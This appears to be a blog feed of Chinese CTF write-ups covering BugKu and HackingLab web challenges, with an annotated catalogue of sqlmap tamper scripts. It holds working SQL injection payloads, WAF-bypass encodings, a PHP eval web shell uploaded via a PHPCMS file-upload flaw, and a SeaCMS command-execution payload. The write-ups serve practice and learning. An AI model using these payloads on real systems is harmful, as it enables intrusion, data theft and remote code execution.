&apos;&apos;.join(binTochar)keyFile = open(&apos;key.tar.gz&apos;, &apos;wb&apos;)keyFile.write(base64.b64decode(&apos;&apos;.join(binTochar)))keyFile.close() 果然脚本还是太菜，解密脚本写了半天没写出来，还是用大佬的吧 解密出来是苍老师…..十一月不撸十一月不撸 总的来说题目还是很基础，几乎都是考脑洞，第十关的编程让我长见识了，第一次写这种脚本，虽然没写出来，路还很长]]></content>
      <tags>
        <tag>Write Up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugKu部分WP]]></title>
    <url>%2F2017%2F10%2F28%2FBugku_WP%2F</url>
    <content type="text"><![CDATA[1.签到题：群公告有flag 2.web2：查看元素得flag 3.文件上传测试：上传php文件提示非jpg，上传jpg文件提示非php文件。于是burp抓包改后缀试试。上传一个jpg文件，抓包改为php后缀，得到flag 4.简单计算题：开玩笑，我不会做？结果限制了输入长度，查看元素改一下长度限制，再输入正确答案得到flag 5.web3：点进页面发现一直弹窗，点击阻止弹窗，查看元素看到一堆编码，是HTML编码格式，解码得到flag 6.sql注入：先试试，单引号之类的能不能报错，试了下都不行，于是想到用宽字节试试，构造?id=1%df%27，报错 再构造1?id=1%df%27 and 1=1--+ 返回正常，1=1返回错误，说明存在sql注入（废话，人家都说了这是sql注入题了） 确定字段数：1?id=1%df%27 and 1=1 order by 1–+ 测试结果表明有两个字段数 确定回显位置：1?id=1%df%27 and 1=1 union select 1,2–+ 爆数据库：1?id=1%df%27 and 1=1 union select 1,database()–+ 库名为sql5 爆表：1?id=1%df%27 and 1=1 union select group_concat(table_name),2 from information_schema.tables where table_schema=database()–+ 表名为key和test。题目说的查询key表id=1的string 直接构造：1?id=1%df%27 and 1=1 union select 1,string from sql5.key where id=1–+ 得到flag 7.SQL注入1：题目提示过滤了关键字，进入页面发现过滤了table等关键字，大小写绕过不可以，双写也不行，编码那些就想复杂了，可以用尖括号绕过过滤，只要想到这点，后面的注入比上一道题还简单。 测试字段数：1?id=1 an&lt;&gt;d 1=1 o&lt;&gt;rder by 2–+ 为2 爆库：1?id=1 an&lt;&gt;d 1=1 u&lt;&gt;nion sel&lt;&gt;ect 1,database()–+ 为sql3 直接构造：1?id=1 an&lt;&gt;d 1=1 u&lt;&gt;nion sel&lt;&gt;ect 1,hash fro&lt;&gt;m sql3.key where id=1–+ 得到flag 8.你必须让他停下：进去发现页面一直在自动刷新，查看源码没得到什么信息，题目说要让他停下，于是想到抓包啊，就能停下。一直抓包，会发现有的包不一样，点开看有flag is here提示，再抓就得到flag了 9.本地包含：不知道是不是题目挂掉了，当初做的时候有源码，是文件包含漏洞，还是说题目改了，没做出来 10.变量1：这道题最后var_dump里的$$args是重点，要用到全局变量才能把$$args输出出来，于是构造：1?args=GLOBALS 11.web4：查看源码，先把这一长串字符拼接起来，url解码得到源码，源码里有密码，输入到输入框得到flag 12.web5：查看源码，发现jsfuck编码的，直接扔进控制台得到flag 13.flag在index里：进去后有个链接，点击后没得到什么信息，查看源码也是，但是注意到url处：1?file=show.php 猜测会不会是文件包含漏洞，于是构造：1?file=php://filter/read=convert.base64-encode/resource=index.php 得到base64加密后的源码，解密得到flag 14.phpscm v9最近正好在开始向实战练习，那就先拿这个练习一下吧 首先进入进入题目是phpcms9.6.0版本，想到这个版本存在任意文件上传漏洞，那就直接开搞吧： 进入注册页面注册，内容随便填，抓包，将抓到的注册信息改为：1siteid=1&amp;modelid=11&amp;username=qwer12345&amp;password=123456&amp;email=wwq7123456@qq.com&amp;info[content]=&lt;img src=http://ovgb1c2jq.bkt.clouddn.com/1.txt#.jpg&gt;&amp;dosubmit=1&amp;protocol= 好吧只能用下别人服务器上的一句话木马，才不是因为我租不起服务器，不是！ 一句话木马内容为：1&lt;?php @eval($_POST[&apos;GETF&apos;]);?&gt; go之后报错，弹出了文件保存路径，连接菜刀，flag在根目录。 本来也想像师傅们一样审计一下代码，发现根本就不是我这个菜鸡能看得懂的，还是太菜了，加油吧。 15.海洋cms网上早就爆出过海洋cms的命令执行漏洞，构造：12GET:http://120.24.86.145:8008/search.php?searchtype=5POST:searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=phpinfo(); 发现成功执行了phpinfo函数，那么将phpinfo()改为： 16.输入密码查看flag：根据题目想到可以爆破，成功得到flag。（要是我会Python多好，burp爆破太慢，回家就开始学Python吧） 17.前女友：查看源码，发现有个code.txt，进去是源码，分析：要满足1$v1 != $v2 &amp;&amp; md5($v1) == md5($v2) 于是想到0e漏洞，拿出我珍藏的两个0e漏洞的值。还有srtcmp空数组漏洞，构造：1?v1=s878926199a&amp;v2=s155964671a&amp;v3[]=0 18.成绩单：看样子像是sql注入，因为在框里输入不同的值能回显不同的值。抓包可以看到是POST传递的id值。接着就是常规的sql注入了，唯一一点值得注意的是：这里是post注入，注释符要用#，不能用–+ 19.web6：题目说速度要快，抓包看看。抓包得到flag，但是需要post margin，没思路，看了下大佬们的wp，需要py脚本，先放着吧，等学习了py再来做这道题 20.cookie欺骗：进入页面就是一长串字符串，没什么用。注意到url处有?line=&amp;filename=a2V5cy50eHQ=，base64解码得：key.txt，而且line没加参数。猜测line参数可以浏览文件的某一行，把key.txt换成index.php，发现还是什么都没有，base64加密一下，有了，改变line的值来遍历源码。只能做到这了，也去看了下大佬们的wp，都是py脚本 21.xss：初步测试，发现双引号和尖括号被过滤，于是想到编码绕过，用img标签，js编码&lt;&gt;，成功弹窗 22.never give up查看源码，发现有个1p.html，进去发现是bugku的论坛，广告差评。但是就没思路了呀，看了下大神wp：1view-source:http://120.24.86.145:8006/test/1p.html 得到源码。提示是先WORDS解码，解码后得到的字符串像base64编码的，再解码。又得到url编码字符串。继续解码得到一个源码：1234567891011121314151617181920212223&quot;;if(!$_GET[&apos;id&apos;])&#123; header(&apos;Location: hello.php?id=1&apos;); exit();&#125;$id=$_GET[&apos;id&apos;];$a=$_GET[&apos;a&apos;];$b=$_GET[&apos;b&apos;];if(stripos($a,&apos;.&apos;))&#123; echo &apos;no no no no no no no&apos;; return ;&#125;$data = @file_get_contents($a,&apos;r&apos;);if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123; require(&quot;f4l2a3g.txt&quot;);&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;?&gt; 最后构造：12GET:http://120.24.86.145:8006/test/hello.php?id=.&amp;a=php://input&amp;b=%0011111POST:bugku is a nice plateform! 23.welcome to bugkuctf查看源码，发现有三个参数，if语句里需要满足传入的txt参数等于welcome to the bugkuctf，但是get和post传入都试过不行。详细查看了下file_get_contents函数，发现此函数需要的是文件类型变量，所以用php伪协议：php://input来传入变量。进入新的页面：hello friend！坑爹啊！我还以为直接出flag呢。源码那里有个hint.php，想到文件包含漏洞：1?file=php://filter/read=convert.base64-encode/resource=hint.php 结果不对，试试把这个构造拼接到上一步的后面呢，还是不行，原来是post的welcome to the bugkuctf忘了，最终得到源码base64解密一下。好吧又来序列化！看来目标文件是flag.php。序列化和反序列化等明天回家后再好好学习一下，看来之前学的还不过关。 24.过狗一句话25.苹果cms这道题在网上找到了苹果cms的漏洞，都尝试了下，发现这道题的版本只适用于sql注入，并且需要登陆。构造：12345678GET:http://120.24.86.145:8009/index.php?m=user-save.htmlPOST:u_password1=123456&amp;u_password2=123456&amp;u_qq=database()&amp;u_email=test%4055gmail.com&amp;u_phone=123456789012345\&amp;u_question=,u_question=(database())%23&amp;u_answer=123456 能查出用户名和数据库，但是当from后面带了内容时就会出问题，编码那些也试过了没用，先留着吧，给自己挖个坑 26.app cms27.各种绕过哟好吧简单的代码审计：123456789101112&lt;?phphighlight_file(&apos;flag.php&apos;);$_GET[&apos;id&apos;] = urldecode($_GET[&apos;id&apos;]);$flag = &apos;flag&#123;xxxxxxxxxxxxxxxxxx&#125;&apos;;if (isset($_GET[&apos;uname&apos;]) and isset($_POST[&apos;passwd&apos;])) &#123; if ($_GET[&apos;uname&apos;] == $_POST[&apos;passwd&apos;]) print &apos;passwd can not be uname.&apos;; else if (sha1($_GET[&apos;uname&apos;]) === sha1($_POST[&apos;passwd&apos;])&amp;($_GET[&apos;id&apos;]==&apos;margin&apos;)) die(&apos;Flag: &apos;.$flag); else print &apos;sorry!&apos;;&#125; id传值为margin，passwd和uname的值不能相同，但是sha1加密后要相同。 开始以为是hash比较缺陷，用的0e漏洞，但是发现不行，因为sha1加密和md5加密还是有一定区别，所以传入数组进行绕过：12GET:http://120.24.86.145:8002/web7/?id=margin&amp;uname[]=aPOST:passwd[]=b 28.web8题目提示：txt？ 又是审计：12345678910111213&lt;?phpextract($_GET);if (!empty($ac))&#123; $f = trim(file_get_contents($fn)); if ($ac === $f) &#123; echo &quot;&lt;p&gt;This is flag:&quot; .&quot; $flag&lt;/p&gt;&quot;; &#125;else&#123; echo &quot;&lt;p&gt;sorry!&lt;/p&gt;&quot;; &#125;&#125;?&gt; 没什么思路这道题，wp上的解释是：12extract函数将$_GET数组的值转为变量，默认是如果有冲突，则覆盖已有的变量。File_get_contents() 利用php://input绕过。 那么思路有了就绕过吧，构造：12GET:http://120.24.86.145:8002/web8/?ac=a&amp;fn=php://inpuPOST:a 29.字符？正则？目测是匹配这个正则：12345678 &lt;?php highlight_file(&apos;2.php&apos;);$key=&apos;KEY&#123;********************************&#125;&apos;;$IM= preg_match(&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match);if( $IM )&#123; die(&apos;key is: &apos;.$key);&#125;?&gt; 一步一步来匹配吧：1234567.*表示匹配任意字符0次及以上.&#123;4,7&#125;表示最少匹配四次最多匹配七次任意字符\/表示匹配/.表示匹配换行符\n以后的任意单字符(.*key)表示匹配key字符[a-z]表示匹配任意字符[:punct:]表示匹配任意标点 所以最后的poc为：1http://120.24.86.145:8002/web10/?id=keykeyxxxxkey:/x/keyb, 30.考细心题目tips：想办法变成admin 进入题目发现是404，但是又和正常的404有区别 用御剑扫出了robots.txt，里面有一个resusl.php，访问得到一句代码： 1if ($_GET[x]==$password) 此处省略1w字 看来是弱口令？构造： 1?x=admin 拿到flag 31.php代码审计这道题说是环境有问题，先不管吧 32.求getshell上传问题，试了00截断和改后缀都不行，用php5别名绕过了，但是还是没反应啊，看来还需要干点什么。 看了下wp，说是Content-Type大小写绕过….这个还没遇到过，涨姿势了 33.flag.php提示：hint 点击提交没反应啊，想到前面的提示，试了几次发现提交一个get参数为hint的时候会出现源码： 1234567891011121314151617181920212223242526272829303132333435 &lt;?phperror_reporting(0);include_once(&quot;flag.php&quot;);$cookie = $_COOKIE[&apos;ISecer&apos;];if(isset($_GET[&apos;hint&apos;]))&#123; show_source(__FILE__);&#125;elseif (unserialize($cookie) === &quot;$KEY&quot;)&#123; echo &quot;$flag&quot;;&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php&#125;$KEY=&apos;ISecer:www.isecer.com&apos;;?&gt; 好吧代码审计，序列化问题，本来说暑假好好学习一下序列化和反序列化漏洞的，结果学各种小事去了，忘了，过几天一定学，先给自己挖个坑 34.web15]]></content>
      <tags>
        <tag>Write Up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap之tamper]]></title>
    <url>%2F2017%2F10%2F28%2Fsqlmap_tamper%2F</url>
    <content type="text"><![CDATA[sqlmap是一款注入神器广为人知，里面的tamper常常用来绕过WAF，很实用的模块，但是却常常被新手忽略（比如我），今天就整理总结一下tamper的用法以及tamper的编写 PS：工具既然叫做工具，就是用来辅助上单的，呸辅助我们完成某些任务的，仅仅适用于当进行某些重复的繁琐工作或是偶尔懒癌发作时，不能过度依赖 ALL表示所有数据库都适用，具体指出哪种数据库就表名只只适用于某些数据库 用法：1sqlmap.py XXXXX -tamper &quot;模块名&quot; apostrophemask.py:1return payload.replace(&apos;\&apos;&apos;, &quot;%EF%BC%87&quot;) if payload else payload 将单引号url编码，用于过滤了单引号的情况 1’ AND ‘1’=’1 to 1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871 ALL apostrophenullencode.py:1return payload.replace(&apos;\&apos;&apos;, &quot;%00%27&quot;) if payload else payload 将单引号替换为宽字节unicode字符，用于过滤了单引号的情况 1’ AND ‘1’=’1 to 1�’ AND �’1�’=�’1 ALL appendnullbyte.py:1return &quot;%s%%00&quot; % payload if payload else payload 在你构造的payload后面加一个空字符 1’ AND ‘1’=’1 to 1’ AND ‘1’=’1[] Access base64encode.py:1return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload 这个看模块名也知道是base64编码 1’ AND ‘1’=’1 to MScgQU5EICcxJz0nMQ== ALL between.py:这个代码有点长，就不贴代码了，可以自己去查看：C:\Python\SQLMap\tamper\between.py 将大于符号和等号用between语句替换，用于过滤了大于符号和等号的情况 1 AND A &gt; B to 1 AND A NOT BETWEEN 0 AND B 1 AND A = B to 1 AND A BETWEEN B AND B ALL bluecoat.py:用随机的空白字符代替空格，并且将等号替换为like，用于过滤了空格和等号的情况 union select from users where id = 1 to union%09select from%09users where id like 1 MySQL 5.1, SGOS chardoubleencode.py:用url编码两次你的payload select * from users to %2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572 ALL charencode.py:用url编码一次你的payload select * from users to %73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72 ALL charunicodeencode.py：用unicode编码payload，只编码非编码字符 select * from users to \u0073\u0065\u006c\u0065\u0063\u0074\u0020\u002a\u0020\u0066\u0072\u006f\u006d\u0020\u0075\u0073\u0065\u0072\u0073 ALL，但是需要asp和asp.net环境 commalesslimit.py：将payload中的逗号用offset代替，用于过滤了逗号并且是两个参数的情况 limit 2,1 to limit 1 offset 2 MySQL commalessmid.py：将payload中的逗号用from for代替，用于过滤了逗号并且是三参数的情况 mid(version(), 1, 1) to mid(version() from 1 for 1) MySQL commentbeforeparentheses.py：1retVal = re.sub(r&quot;\b(\w+)\(&quot;, &quot;\g&lt;1&gt;/**/(&quot;, retVal) 在某个单词后的第一个括号前面加入/**/，用于过滤了函数的情况 union select group_concat(table_name) to union select group_concat/**/(table_name) ALL concat2concatws.py：1payload = payload.replace(&quot;CONCAT(&quot;, &quot;CONCAT_WS(MID(CHAR(0),0,0),&quot;) 用于过滤了concat函数的情况 concat(1,2) to concat_ws(mid(char(0), 0, 0), 1, 2) MySQL equaltolike.py：1retVal = re.sub(r&quot;\s*=\s*&quot;, &quot; LIKE &quot;, retVal) 将等号用like代替，用于过滤了等号的情况 select from users where id=1 to select from users where id like 1 ALL escapequotes.py：1return payload.replace(&quot;&apos;&quot;, &quot;\\&apos;&quot;).replace(&apos;&quot;&apos;, &apos;\\&quot;&apos;) 将单引号转换成\\’，双引号转换成\\”，用于过滤了单引号或双引号的情况 1’ and 1=1–+ to 1\\’ and 1=1–+ ALL greatest.py：用greatest代替大于符号，用于大于符号被过滤了的情况 1 and a&gt;b to 1 and greatest(a,b+1)=a ALL halfversionedmorekeywords.py：在关键字前添加注释，用于过滤了关键字的情况 union select 1,2 to /*!0union/*!0select 1,2 MySQL &lt; 5.1 htmlencode.py：1return re.sub(r&quot;[^\w]&quot;, lambda match: &quot;&amp;#%d;&quot; % ord(match.group(0)), payload) if payload else payload 从名字就知道是将payload进行html编码 1’ and 1=1–+ to &#49;&#39;&#32;&#97;&#110;&#100;&#32;&#49;&#61;&#49;&#45;&#45;&#43; ALL ifnull2ifisnull.py：将ifnull()函数转为if(isnull())函数，用于过滤了ifnull函数的情况 ifnull(1, 2) to if(isnull(1), 2, 1) MySql informationschemacomment.py：1retVal = re.sub(r&quot;(?i)(information_schema)\.&quot;, &quot;\g&lt;1&gt;/**/.&quot;, payload) 在information_schema后面加上/**/，用于绕过对information_schema.的情况 select table_name from information_schema.tables to select table_name from information_schema/**/.tables ALL lowercase.py：将payload里的大写转为小写 UNION SELECT to union select ALL modsecurityversioned.py：用注释来包围完整的查询语句，用于绕过ModSecurity开源waf 1 and 2&gt;1–+ to 1 /!30874and 2&gt;1\/–+ MySQL modsecurityzeroversioned.py：用注释来包围完整的查询语句，用于绕过waf，和上面类似 1 and 2&gt;1–+ to 1 /!00000and 2&gt;1\/–+ MySQL ####multiplespaces.py： 在关键字周围添加多个空格 union select 1,2–+ to union select 1,2–+ ALL nonrecursivereplacement.py：关键字双写，可用于关键字过滤 union select 1,2–+ to uniounionn selecselectt 1,2–+ ALL overlongutf8.py：这个不是很懂，也去网上搜了下，都说是”转换给定的payload当中的所有字符“，类似空格大于小于这种 select field from table where 2&gt;1 to select%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1 ALL percentage.py：用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号 select from users to %s%e%l%e%c%t %f%r%o%m %u%s%e%r%s ALL,但是需要ASP环境 plus2concat.py：用concat函数来替代加号，用于加号被过滤的情况 select char(13)+char(114)+char(115) from user to select concat(char(113),char(114),char(115)) from user SQL Server 2012+ plus2fnconcat.py：用fn concat来替代加号，和上面类似 select char(13)+char(114)+char(115) from user to select {fn concat({ fn concat(char(113),char(114))},char(115))} from user Microsoft SQL Server 2008+ randomcase.py：将payload随机大小写，可用于大小写绕过的情况 union select 1,2–+ to UniOn SElect 1,2–+ ALL randomcomments.py：在payload的关键字中间随机插入/**/，可用于绕过关键字过滤 union select 1,2–+ to un/**/ion sele/**/ct 1,2–+ ALL securesphere.py：1return payload + &quot; and &apos;0having&apos;=&apos;0having&apos;&quot; if payload else payload 在payload后面加入字符串，可以自定义 1’ and 1=1 to 1’ and 1=1 ‘0having’=’0having’ ALL sp_password.py：1retVal = &quot;%s%ssp_password&quot; % (payload, &quot;-- &quot; if not any(_ if _ in payload else None for _ in (&apos;#&apos;, &quot;-- &quot;)) else &quot;&quot;) 在payload语句后添加ssp_password，用于迷惑数据库日志 1’ and 1=1–+ to 1 and 1=1– sp_password MSSQL space2comment.py：用/**/替代空格，用于空格的绕过 union select 1,2–+ to union/**/select/**/1,2–+ ALL space2dash.py：用注释符–和一个随机字符串加一个换行符替换控制符 union select 1,2–+ to union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+ MSSQLSQLite space2hash.py：和上面类似，不过这儿是用#注释符 union select 1,2–+ to union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+ MySQL space2morecomment.py：将空格用/**_**/替代 union select 1,2–+ to union/****/select/**\**/1,2–+ ALL space2morehash.py：和space2hash.py类似，但是这儿多一个#和换行符，具体看一下对比： space2hash.py： union select 1,2–+ to union %23 HSHjsJh %0A select %23 HhjHSJ %0A1,2–+ space2morehash.py：union select 1,2–+ to union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2–+ MySQL &gt;= 5.1.13 space2mssqlblank.py：1blanks = (&apos;%01&apos;, &apos;%02&apos;, &apos;%03&apos;, &apos;%04&apos;, &apos;%05&apos;, &apos;%06&apos;, &apos;%07&apos;, &apos;%08&apos;, &apos;%09&apos;, &apos;%0B&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0E&apos;, &apos;%0F&apos;, &apos;%0A&apos;) 用 这些随机空白符替换payload中的空格 union select 1,2–+ to union%01select%021,2–+ SQL Server space2mssqlhash.py：用#加一个换行符替换payload中的空格 union select 1,2–+ to union%23%0Aselect%23%0A1,2–+ MSSQLMySQL space2mysqlblank.py：1blanks = (&apos;%09&apos;, &apos;%0A&apos;, &apos;%0C&apos;, &apos;%0D&apos;, &apos;%0B&apos;) 用这些随机空白符替换payload中的空格 union select 1,2–+ to union%09select%0D1,2–+ MySQL space2mysqldash.py：用–加一个换行符替换空格 union select 1,2–+ to union–%0Aselect–%0A1,2–+ MySQLMSSQL space2plus.py：用加号替换空格 union select 1,2–+ to union+select+1,2–+ ALL space2randomblank.py：1blanks = (&quot;%09&quot;, &quot;%0A&quot;, &quot;%0C&quot;, &quot;%0D&quot;) 用这些随机空白符替换payload中的空格 union select 1,2–+ to union%09select%0C1,2–+ ALL symboliclogical.py：1retVal = re.sub(r&quot;(?i)\bAND\b&quot;, &quot;%26%26&quot;, re.sub(r&quot;(?i)\bOR\b&quot;, &quot;%7C%7C&quot;, payload)) 用&amp;&amp;替换and，用||替换or，用于这些关键字被过滤的情况 1 and 1=1 to 1 %26%26 1=1 1 or 1=1 to 1 %7c%7c 1=1 ALL unionalltounion.py：1return payload.replace(&quot;UNION ALL SELECT&quot;, &quot;UNION SELECT&quot;) if payload else payload 用union select替换union all select union all select 1,2–+ to union select 1,2–+ ALL unmagicquotes.py：用宽字符绕过 GPC addslashes 1‘ and 1=1 to 1%df%27 and 1=1– ALL uppercase.py：将payload大写 union select to UNION SELECT ALL varnish.py：123headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)headers[&quot;X-originating-IP&quot;] = &quot;127.0.0.1&quot;return payload 添加一个HTTP头“X-originating-IP”来绕过WAF 还可以自定义： 12345&gt;&gt; X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)&gt;&gt; X-remote-IP: TARGET_PROXY_IP (184.189.250.X)&gt;&gt; X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)&gt;&gt; x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)&gt;&gt; X-remote-IP: * or %00 or %0A ALL versionedkeywords.py对不是函数的关键字进行注释 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))# to 1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))# MySQL versionedmorekeywords.py：注释每个关键字 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))# to 1/!UNION//!ALL//!SELECT//!NULL/,/!NULL/,/!CONCAT/(/!CHAR/(58,122,114,115,58),/!IFNULL/(CAST(/!CURRENT_USER/()/!AS//!CHAR/),/!CHAR/(32)),/!CHAR/(58,115,114,121,58))# MySQL &gt;= 5.1.13 xforwardedfor.py：123headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)headers[&quot;X-Forwarded-For&quot;] = randomIP()return payload 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF ALL]]></content>
      <tags>
        <tag>工具</tag>
        <tag>Owasp top 10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HackingLab_SQL注入关WP]]></title>
    <url>%2F2017%2F10%2F14%2FHackingLab-SQL%E6%B3%A8%E5%85%A5%E5%85%B3WP%2F</url>
    <content type="text"><![CDATA[脚本关下面还有注入关，上传关，解密关，综合关，那就都刷一遍吧，多见识见识套路 最简单的SQL注入进入题目是一个登陆框，源码有提示说login as admin，而且有一个验证码，估计是防sqlmap的，那就手注吧 简单尝试发现不是get型注入，post型注入也试了挺久，但是也没结果，那试试弱口令还是不对，卧槽我怎么这么菜，最简单的SQL注入都不会。再试试万能密码，OK成功登陆，构造语句为： 1admin&apos; or &apos;1&apos;=&apos;1 最简单的SQL注入(熟悉注入环境)题目源码提示：id=1，那估计是get注入了 尝试报错： 1http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1&apos; 成功报错，测试字段数： 1http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=-1 and 1=1 group by 4--+ 结果显示为三个字段，这道题如果语句正确，页面是空白，如果语句错误显示的错误为： 1Warning: mysql_fetch_row() expects parameter 1 to be resource, boolean given in sqli3_6590b07a0a39c8c27932b92b0e151456/index.php on line 37 和常规的不一样，接下来就是sql注入一条龙了 防注入还是提示id=1，尝试了下是宽字节注入 1http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%df%27 成功报错，但是爆库名都是正常的，爆表明的时候报错了，猜测是column关键字被过滤了，试了很多方法没绕过，所以换个姿势去找flag： 1http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1ß&apos; or 1=1 limit 2,1# 这个姿势对于我这个菜鸡来说还是比较新颖，学到了 到底能不能回显题目里有一些像是暗示的东西: 1小明经过学习，终于对SQL注入有了理解，她知道原来sql注入的发生根本原因还是数据和语句不能正确分离的原因，导致数据作为sql语句执行；但是是不是只要能够控制sql语句的一部分就能够来利用获取数据呢？小明经过思考知道，where条件可控的情况下，实在是太容易了，但是如果是在limit条件呢？ 猜测start和num参数相当limit start,num。但是num不起作用。limit注入还没怎么遇到过，赶紧去学习一波： 1http://www.freebuf.com/articles/web/57528.html 构造如下语句发现成功执行： 1http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=1&amp;num=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); 只要在： 1http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=1&amp;num=1 procedure analyse(extractvalue(rand(),concat(0x3a,(SQL语句))),1); SQL语句处执行SQL语句就可注出数据 邂逅试了很多，都没思路，wp上说是图片类型的注入我去，新姿势啊，利用图片地址进行注入，还得用bp才能查看报错信息 构造语句： 1GET /sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg%df%27 HTTP/1.1 报错，剩下的就是常规的注入了 ErrorBased题目就提示是基于布尔的盲注，开搞 单引号报错，于是构造： 1http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin&apos; union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23 爆出库名 构造： 1http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/index.php?username=admin&apos; union select count(*),concat(0x3a,0x3a,(select distinct table_name from information_schema.tables where table_schema=database() limit 2,1),0x3a,0x3a,floor(2*rand(0)))a FROM information_schema.tables GROUP BY a %23 爆出表名，后面就是常规注入步骤了 盲注测试了下基于错误的盲注不行，只能用基于时间的盲注： 1http://lab1.xseclab.com/sqli7_b95cf5af3a5fbeca02564bffc63e92e5/blind.php?username=admin&apos; and (select if(ascii(substr(database(),1,1))&gt;100,sleep(5),NULL))--+ 接下来就是常规的注入流程了 SQL注入通用防护题目提示说GET和POST型的注入都过滤了，那么是Cookie型？还是其他类型，试试 在Cookie值后面加分号会显示未登录，加其他符号也是，除了等于号，这儿应该是一个突破口，构造： 1Cookie: PHPSESSID=0160637c31e66098b42bf5f92cb13413;id=1&apos; 报错了，查询字段数： 1Cookie: PHPSESSID=0160637c31e66098b42bf5f92cb13413;id=1 and 1=1 order by 3 后面就是常规注入流程了 据说哈希后的密码是不能产生注入的右键查看源码能看到php源码： 123456789101112131415161718192021222324252627&lt;?phpinclude &quot;config.php&quot;;if(isset($_GET[&apos;userid&apos;]) &amp;&amp; isset($_GET[&apos;pwd&apos;]))&#123; $strsql=&quot;select * from `user` where userid=&quot;.intval($_GET[&apos;userid&apos;]).&quot; and password=&apos;&quot;.md5($_GET[&apos;pwd&apos;], true) .&quot;&apos;&quot;; $conn=mysql_connect($dbhost,$username,$pwd); mysql_select_db($db,$conn); $result=mysql_query($strsql); print_r(mysql_error()); $row=mysql_fetch_array($result); mysql_close($conn); echo &quot;&lt;pre&gt;&quot;; print_r($row); echo &quot;&lt;/pre&gt;&quot;; if($row!=null)&#123; echo &quot;Flag: &quot;.$flag; &#125; &#125;else&#123; echo &quot;PLEASE LOGINT!&quot;;&#125;echo &quot;&lt;noscript&gt;&quot;;echo file_get_contents(__FILE__); userid被强制转换成int型，pwd被hash加密了，那就从userid出发试试 但是搞了下没反应啊，看看师傅们的wp 原来就是从pwd出发啊，以下是师傅们的wp： 其中最主要的就是md5()函数，当第二个参数为true时，会返回16字符的二进制格式。当为false的时候， 返回的就是32字符十六进制数。默认的是false模式。具体的差别通过下面这个代码来看。 12md5(&quot;123456&quot;); //e10adc3949ba59abbe56e057f20f883emd5(&quot;123456&quot;,true); //� �9I�Y��V�W��&gt; 可以看到当参数为true的时候，md5之后的值就会乱码。那么只要md5(str,true)之后的值是包含了&#39;or&#39;&lt;trash&gt;这样的字符串，那么sql语句就会变为select * from users where usrid=&quot;XXX&quot; and password=&#39;&#39;or&#39;&lt;trash&gt;&#39;。如此就可以绕过了。那么这样的str字符串存在吗？所幸还好存在一个，就是ffifdyop。那么我们最终的payload就是： 